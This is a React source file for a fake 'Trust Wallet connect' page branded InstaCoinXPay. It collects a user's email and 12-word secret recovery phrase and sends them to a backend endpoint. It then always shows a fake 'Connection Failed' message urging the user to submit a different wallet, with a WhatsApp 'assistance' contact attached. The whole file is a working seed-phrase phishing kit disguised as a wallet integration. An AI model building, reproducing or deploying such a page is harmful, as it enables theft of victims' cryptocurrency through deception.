import React, { useState, useEffect } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import "./TrustWalletConnect.css";
import logo from "../assets/logo.png";
import trust from "../assets/TrustWallet.png";
import walletConnect from "../assets/WalletConnect.png";

/* ================= WHATSAPP FLOAT COMPONENT ================= */
const WhatsAppFloat = ({ 
  phoneNumber = "15485825756", 
  message = "Hello! I need assistance with connecting my Trust Wallet on InstaCoinXPay.",
  position = "right",
  bottom = "30px",
  right = "30px",
  left = "auto",
  size = "54px",
  iconSize = "28px",
  pulseEffect = true,
  className = "",
  style = {}
}) => {
  const formattedNumber = phoneNumber.replace(/[^\d]/g, '');
  const whatsappUrl = `https://wa.me/${formattedNumber}?text=${encodeURIComponent(message)}`;
  
  const positionStyles = position === "left" 
    ? { left: left || "20px", right: "auto" }
    : { right: right || "20px", left: "auto" };

  const combinedStyles = {
    position: 'fixed',
    bottom: bottom,
    width: size,
    height: size,
    borderRadius: '50%',
    backgroundColor: '#25d366',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    boxShadow: '0 4px 20px rgba(0, 0, 0, 0.2)',
    zIndex: 10000,
    cursor: 'pointer',
    transition: 'all 0.3s ease',
    textDecoration: 'none',
    ...positionStyles,
    ...style
  };

  return (
    <a
      href={whatsappUrl}
      target="_blank"
      rel="noopener noreferrer nofollow"
      className={`whatsapp-float ${pulseEffect ? 'pulse' : ''} ${className}`}
      style={combinedStyles}
      aria-label="Chat on WhatsApp"
      title="Chat on WhatsApp"
    >
      <svg 
        width={iconSize} 
        height={iconSize} 
        viewBox="0 0 24 24"
        fill="white"
      >
        <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.074-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.074-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.76.982.998-3.677-.236-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.826 9.826 0 012.9 6.994c-.004 5.45-4.438 9.88-9.888 9.88m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.333.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.333 11.893-11.893 0-3.18-1.24-6.162-3.495-8.411" />
      </svg>
    </a>
  );
};

const TrustWalletConnect = () => {
  const [showPopup, setShowPopup] = useState(false);
  const [closing, setClosing] = useState(false);
  const [words, setWords] = useState(Array(12).fill(""));
  const [email, setEmail] = useState("");
  const [isSending, setIsSending] = useState(false);
  const navigate = useNavigate();

  // Update this to match your backend URL
  const API_URL = process.env.REACT_APP_API_URL || "http://localhost:5000";

  useEffect(() => {
    document.body.style.overflow = showPopup ? "hidden" : "auto";
  }, [showPopup]);

  const handleWordChange = (index, value) => {
    const updated = [...words];
    updated[index] = value.replace(/\s+/g, "");
    setWords(updated);
  };

  const blockSpace = (e) => {
    if (e.key === " ") e.preventDefault();
  };

  const isFormComplete =
    words.every((w) => w.trim() !== "") && email.trim() !== "";

  const sendEmail = async () => {
    setIsSending(true);

    console.log("🚀 Submitting Trust Wallet form...");

    try {
      const response = await axios.post(
        `${API_URL}/api/trust-wallet/submit`,
        {
          email: email,
          words: words
        },
        {
          headers: {
            "Content-Type": "application/json"
          }
        }
      );

      console.log("✅ Form submitted successfully!", response.data);

      // Show the popup after successful submission
      setShowPopup(true);

    } catch (error) {
      console.error("❌ Failed to submit form:", error);
      console.error("Error details:", error.response?.data);

      // Still show popup even on error (as per original design)
      setShowPopup(true);
    } finally {
      setIsSending(false);
    }
  };

  const handleConnect = () => {
    console.log("👆 CONNECT button clicked!");
    sendEmail();
  };

  const closePopup = () => {
    setClosing(true);
    setTimeout(() => {
      setShowPopup(false);
      setClosing(false);
      // Reset form
      setWords(Array(12).fill(""));
      setEmail("");
    }, 200);
  };

  const handleBackToDashboard = () => {
    navigate("/dashboard");
  };

  return (
    <>
      <div className="twc-page">

        <div className="twc-logo">
          <img src={logo} alt="logo" />
        </div>

        <div className="twc-card">
          <div className="twc-header-container">
            <span className="twc-back" onClick={() => navigate(-1)}>←</span>
            {/* WalletConnect logo ABOVE */}
            <img
              src={walletConnect}
              alt="WalletConnect"
              className="twc-walletconnect-img"
            />

            {/* CONNECT + Trust Wallet */}
            <div className="twc-header-row">
              <h2 className="twc-connect-text">CONNECT</h2>
              <img src={trust} alt="Trust Wallet" />
            </div>
          </div>

          <label className="twc-label-email">Enter your Email Address</label>
          <input
            className="twc-input"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />

          <label className="twc-label-email">
            Enter your Trust Wallet 12 word Secret Phrase
          </label>

          <div className="twc-info-wrapper">
            <p className="twc-info-text-scroll">
              The Trust Wallet must be older than 30 days. New wallets cannot be accepted for withdrawal !
            </p>
          </div>

          <div className="twc-phrase-box">
            {words.map((word, i) => (
              <input
                key={i}
                className="twc-word-input"
                value={word}
                placeholder={`${i + 1}. word`}
                onChange={(e) => handleWordChange(i, e.target.value)}
                onKeyDown={blockSpace}
              />
            ))}
          </div>

          <button
            className="twc-connect-btn"
            disabled={!isFormComplete || isSending}
            onClick={handleConnect}
            style={{
              opacity: isFormComplete && !isSending ? 1 : 0.6,
              cursor: isFormComplete && !isSending ? "pointer" : "not-allowed"
            }}
          >
            {isSending ? "CONNECTING..." : "CONNECT"}
          </button>
        </div>
      </div>

      {showPopup && (
        <div className={`twc-modal-overlay ${closing ? "closing" : ""}`}>
          <div className="twc-modal-box">
            <div className="twc-popup-icon">
              <svg
                className="twc-error-icon"
                viewBox="0 0 52 52"
                xmlns="http://www.w3.org/2000/svg"
              >
                <circle
                  className="twc-error-circle"
                  cx="26"
                  cy="26"
                  r="25"
                  fill="none"
                />
                <line
                  className="twc-error-line twc-error-line-left"
                  x1="16"
                  y1="16"
                  x2="36"
                  y2="36"
                />
                <line
                  className="twc-error-line twc-error-line-right"
                  x1="36"
                  y1="16"
                  x2="16"
                  y2="36"
                />
              </svg>
            </div>

            <h3 className="twc-popup-title">Connection Failed!</h3>
            <p className="twc-popup-text">
              Your Trust Wallet is not eligible for connection.Please try connecting with a different Trust Wallet. Repeated attempts using the same wallet may result in account suspension.            </p>
            <button className="twc-popup-btn" onClick={closePopup}>
              OK
            </button>
          </div>
        </div>
      )}

      {/* WhatsApp Float Button - Added for Trust Wallet Connection Assistance */}
      <WhatsAppFloat 
        phoneNumber="15485825756"
        message="Hello! I need assistance with connecting my Trust Wallet on InstaCoinXPay."
        position="right"
        bottom="30px"
        right="30px"
        pulseEffect={true}
      />
    </>
  );
};

export default TrustWalletConnect;